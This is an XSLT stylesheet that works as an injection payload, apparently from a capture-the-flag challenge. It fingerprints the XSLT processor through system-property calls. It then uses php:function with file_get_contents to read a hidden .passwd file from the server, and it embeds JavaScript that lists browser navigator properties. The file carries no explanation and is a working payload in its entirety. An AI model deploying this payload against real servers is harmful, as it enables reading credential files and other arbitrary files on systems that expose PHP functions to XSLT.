<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" 
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl" >
 
<xsl:template match="/">
 <html>
 <body>
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 
   EXEC : <xsl:value-of select="php:function('file_get_contents', './.6ff3200bee785801f420fba826ffcdee/.passwd')" /> <br />
   
 
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
 <br />Navigator Object (JavaScript stuff):
 <pre><font size="2"><script>for (i in navigator) { document.write('<br />navigator.' + i +
' = ' + navigator[i]);} </script><div id="output"/><script> if
(navigator.userAgent.search("Firefox")!=-1) { output=''; for (i in navigator) {
if(navigator[i]) {output+='navigator.'+i+' = '+navigator[i]+'\n';}} var txtNode =
document.createTextNode(output); document.getElementById("output").appendChild(txtNode)
}</script></font></pre>
 </body>
 </html>
</xsl:template>
</xsl:stylesheet>
